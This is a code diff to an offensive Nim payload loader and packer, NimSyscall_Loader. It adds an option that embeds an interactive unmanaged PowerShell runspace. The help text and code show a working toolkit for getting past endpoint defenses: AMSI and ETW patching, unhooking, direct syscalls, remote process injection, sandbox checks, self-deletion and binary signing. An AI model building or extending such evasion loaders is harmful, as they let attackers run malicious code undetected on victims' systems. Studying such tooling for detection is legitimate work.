@@ -63,7 +63,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.6
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --clone=<dllToClone> --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --sleep=<10> --shellcode --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --noRES --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --clone=<dllToClone> --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --sleep=<10> --shellcode --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -158,6 +158,7 @@ Options:
 [C# assembly Packing]
 
   --csharp    Encrypt a C# assembly to load it on runtime
+  --interactivePS    Load an interactive unmanaged Powershell Runspace (https://github.com/S3cur3Th1sSh1t-Sponsors/PwnPowershell)
 
 """
 
@@ -197,6 +198,7 @@ var
     sandboxchecks: seq[string]
     sandbox: bool = false
     csharp: bool = false
+    interactivePS: bool = false
     arguments: string = ""
     embeddedArguments : bool = false
     AMSI: bool = true
@@ -306,6 +308,12 @@ if args["--clone"]:
     dllhijack = true
     let cloneDLL = args["--clone"]
     dllToClone = fmt"{cloneDLL}"
+
+if args["--interactivePS"]:
+    csharp = true
+    interactivePS = true
+    shellcode = false
+    peload = false
 
 var customLoaderName: string = rndStr(rand(5..15))
 
@@ -492,26 +500,31 @@ if (peload or peinject):
         quit(1)
 when system.hostOS == "windows":
     if (csharp):
-        blob = readFile(filename)
-        var blobbytes = toByteSeq(blob)
-        var code = fmt"""
-        using System;
-        public class Check {{
-          public void ifAssembly() {{
-            object asd = System.Reflection.AssemblyName.GetAssemblyName(@"{filename}");
-          }}
-        }}
-        """
-        try:
-            var res = compile(code)
-            var o = res.CompiledAssembly.new("Check")
-            o.ifAssembly()
-        except:
-            echo "[-] Error - you didn't specify a C# assembly!"
-            noassembly = true
+        if (interactivePS):
+            var newPath = packerPath & "\\pwnPowershell\\RunSpace.exe"
+            echo newPath
+            blob = readFile(newPath)
+        else:
+            blob = readFile(filename)
+            var blobbytes = toByteSeq(blob)
+            var code = fmt"""
+            using System;
+            public class Check {{
+              public void ifAssembly() {{
+                object asd = System.Reflection.AssemblyName.GetAssemblyName(@"{filename}");
+              }}
+            }}
+            """
+            try:
+                var res = compile(code)
+                var o = res.CompiledAssembly.new("Check")
+                o.ifAssembly()
+            except:
+                echo "[-] Error - you didn't specify a C# assembly!"
+                noassembly = true
 
-    if (noassembly):
-        quit(1)
+            if (noassembly):
+                quit(1)
 
 #Read file and if PE convert to shellcode before
 if (peinject):
@@ -551,7 +564,7 @@ elif(sgn):
     else:
         discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -a 64 -c 3  -o tmpshellcode.bin {filename}")
     blob = readFile("tmpshellcode.bin")
-else:
+elif(csharp == false):
     blob = readFile(filename)
 
 var
@@ -559,7 +572,6 @@ var
 
     ectx: ECB[aes256]
     key: array[aes256.sizeKey, byte]
-
 
 # AES256 block size is 128 bits or 16 bytes, so we need to pad plaintext with
 # 0 bytes. Not the best crypto, but to be honest - who tries to break AES256??
@@ -1537,6 +1549,9 @@ elif system.hostOS == "linux":
 if(denim):
     basicCompileFlags.add("-d:denim ")
 
+
+basicCompileFlags.add("--hint[all]:off ")
+
 if(hellsgate):
     basicCompileFlags.add("-d:Hellsgate ")
 elif(getfreshstub):
@@ -1614,8 +1629,8 @@ if debugMode:
     basicCompileFlags = basicCompileFlags.replace("--hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size", "")
     basicCompileFlags = basicCompileFlags.replace("--app=console --passc=-flto --passl=-flto", "")
 
-echo "Compile command:"
-echo basicCompileFlags
+#echo "Compile command:"
+#echo basicCompileFlags
 echo "\n\n"
 
 when system.hostOS == "windows":
